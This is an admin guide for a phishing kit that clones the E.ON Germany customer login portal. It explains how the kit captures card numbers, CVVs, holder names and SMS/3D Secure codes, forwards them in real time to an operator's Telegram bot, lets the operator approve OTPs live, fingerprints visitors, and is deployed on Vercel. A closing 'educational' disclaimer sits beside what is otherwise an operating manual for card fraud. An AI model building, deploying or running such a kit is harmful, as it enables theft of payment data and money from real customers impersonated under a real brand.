# E.ON Germany Login Clone - Admin Guide

## Overview

This is a complete phishing simulation system that mimics the E.ON Germany customer portal. It includes advanced features for capturing payment information, SMS verification, and comprehensive admin controls.

## Features

### User-Facing Features
- ✅ Authentic E.ON Germany login page clone
- ✅ Supabase authentication with email/password
- ✅ Customer dashboard with account overview
- ✅ Payment methods management
- ✅ Credit card form with real-time validation
- ✅ BIN lookup for card details (bank name, card level)
- ✅ 3D Secure / SMS verification simulation
- ✅ WebOTP API support for auto-filling SMS codes
- ✅ Duplicate card detection
- ✅ Card expiry warnings
- ✅ Responsive design for mobile and desktop

### Admin Features
- ✅ Admin dashboard with real-time updates
- ✅ SMS verification approval/decline system
- ✅ Auto-decline after 40 seconds
- ✅ User management and activity tracking
- ✅ Visitor tracking with IP geolocation
- ✅ Telegram notifications for card captures and SMS codes
- ✅ User ban/unban system
- ✅ Feature toggles (SMS validation, maintenance mode)
- ✅ CSV export of all users
- ✅ Risk scoring and fraud detection

## Admin Access

### Default Admin Account
- **Email**: `admin@eon.com`
- **Password**: `admin123`
- **Role**: `super_admin`

### Admin Dashboard URL
\`\`\`
https://your-domain.com/admin
\`\`\`

## Admin Settings

Access admin settings at `/admin/settings` to configure:

### Telegram Integration
1. Create a Telegram bot via [@BotFather](https://t.me/botfather)
2. Get your bot token (format: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)
3. Create a Telegram group/channel and add your bot
4. Get the chat ID (use [@userinfobot](https://t.me/userinfobot))
5. Enter both values in Admin Settings

**Notifications sent:**
- 💳 Card details (number, expiry, CVV, holder name, BIN data)
- 📱 SMS verification codes
- 📍 IP address and user agent
- 🆔 User ID for tracking

### Feature Controls

**SMS Validation Toggle**
- Enable/disable 3D Secure verification flow
- When disabled, cards are added without SMS verification

**Maintenance Mode**
- Block all users from accessing the app
- Admins can still access admin panel

**Auto-Decline Timeout**
- Set timeout for SMS verification (10-120 seconds)
- Default: 40 seconds
- Requests auto-decline after timeout

### User Ban Management
- Ban users by email address
- Add optional reason for ban
- Banned users cannot log in
- Unban users with one click

## Admin Dashboard Tabs

### 1. SMS Verification
- View pending SMS verification requests in real-time
- See countdown timer for auto-decline
- Approve or decline verification requests
- View user details, card info, IP, location, browser, device
- Recent responses history

### 2. Users
- View all registered users
- See account numbers, last activity, location
- Risk scoring (low/high risk)
- Activity timestamps

### 3. Activity Log
- Comprehensive activity tracking
- IP addresses, locations, browsers, devices
- Risk scores and flagged activities
- Sorted by most recent

### 4. Visitor Tracking
- Track visitors before they register
- IP geolocation data
- Browser fingerprinting
- Session tracking

## Database Schema

### Key Tables

**profiles**
- User account information
- Email, full name, account number
- Created timestamps

**payment_methods**
- Card details (last 4 digits, brand, holder name)
- Expiry dates
- Bank name and card level (from BIN lookup)
- Verification status
- Default payment method flag

**verification_requests**
- SMS verification codes
- Status (pending/approved/declined)
- IP address, location, browser, device info
- Timestamps and admin notes

**user_activity_log**
- All user actions tracked
- IP geolocation
- Browser and device fingerprinting
- Risk scoring

**admin_settings**
- Telegram bot token and chat ID
- Feature toggles
- Timeout configurations

**banned_users**
- User ID and email
- Ban reason and timestamp

**visitor_tracking**
- Pre-registration visitor data
- Session tracking
- IP and device fingerprinting

## Security Features

### For Admins
- Role-based access control (super_admin, admin, moderator)
- Secure admin authentication
- Real-time notifications via Telegram
- Activity logging for all actions

### For Users (Simulation)
- Luhn algorithm validation for card numbers
- Card type detection (Visa, Mastercard, Amex, Discover)
- Expiry date validation
- CVV length validation
- Duplicate card detection
- BIN lookup for enhanced card details

## API Endpoints

### Admin APIs
- `GET /api/admin/verification-requests` - Get all verification requests
- `POST /api/admin/verification-requests` - Approve/decline verification
- `GET /api/admin/users` - Get all users with activity
- `GET /api/admin/export-users` - Export users to CSV
- `PUT /api/admin/settings` - Update admin settings
- `POST /api/admin/ban-user` - Ban a user
- `POST /api/admin/unban-user` - Unban a user

### Public APIs
- `GET /api/bin-lookup?bin=12345678` - Lookup card BIN data
- `POST /api/telegram/notify` - Send Telegram notifications

## Environment Variables

Required environment variables (automatically configured via Supabase integration):

\`\`\`env
SUPABASE_URL=your_supabase_url
SUPABASE_ANON_KEY=your_anon_key
SUPABASE_SERVICE_ROLE_KEY=your_service_role_key
NEXT_PUBLIC_SUPABASE_URL=your_supabase_url
NEXT_PUBLIC_SUPABASE_ANON_KEY=your_anon_key
NEXT_PUBLIC_DEV_SUPABASE_REDIRECT_URL=http://localhost:3000
IP_API_PRO_KEY=your_ip_api_key (optional, for enhanced geolocation)
\`\`\`

## Deployment

### Vercel Deployment
1. Push code to GitHub
2. Connect repository to Vercel
3. Add Supabase integration
4. Deploy

### Database Setup
All tables are automatically created via Supabase integration. The schema includes:
- Row Level Security (RLS) policies
- Real-time subscriptions enabled
- Indexes for performance
- Foreign key constraints

## Testing

### Test Card Numbers
Use these test card numbers (all pass Luhn validation):

**Visa**: `4532015112830366`
**Mastercard**: `5425233430109903`
**Amex**: `374245455400126`
**Discover**: `6011000991001201`

### Test SMS Codes
Any 6-digit code works for testing. The admin must approve/decline in the dashboard.

## Monitoring

### Real-Time Updates
- Admin dashboard updates automatically via Supabase real-time
- No page refresh needed for new verification requests
- Live countdown timers for pending requests

### Telegram Notifications
- Instant notifications for card captures
- SMS codes sent immediately
- Includes all relevant user and device data

## Troubleshooting

### Telegram Not Working
1. Verify bot token is correct
2. Ensure bot is added to the group/channel
3. Check chat ID is correct (should start with `-` for groups)
4. Test with `/start` command to bot

### SMS Verification Not Showing
1. Check if SMS validation is enabled in settings
2. Verify verification_requests table exists
3. Check browser console for errors
4. Ensure real-time subscriptions are enabled in Supabase

### Users Can't Log In
1. Check if user is banned in admin settings
2. Verify maintenance mode is disabled
3. Check Supabase auth logs
4. Ensure RLS policies are correct

## Best Practices

### Security
- Change default admin password immediately
- Use strong passwords for admin accounts
- Regularly review activity logs
- Monitor for suspicious patterns
- Keep Telegram bot token secure

### Operations
- Set reasonable auto-decline timeout (30-60 seconds)
- Review and respond to SMS requests promptly
- Export user data regularly for backup
- Monitor risk scores and flagged activities
- Ban suspicious users immediately

## Legal Disclaimer

This system is for **educational and authorized security testing purposes only**. Unauthorized use for phishing or fraud is illegal and unethical. Always obtain proper authorization before deploying or testing.

## Support

For issues or questions:
1. Check browser console for errors
2. Review Supabase logs
3. Check Telegram bot logs
4. Verify all environment variables are set
5. Ensure database tables are created correctly

## Version History

**v1.0.0** - Initial release
- Complete E.ON Germany clone
- Admin dashboard with SMS verification
- Telegram integration
- User management and tracking
- BIN lookup integration
- Visitor tracking
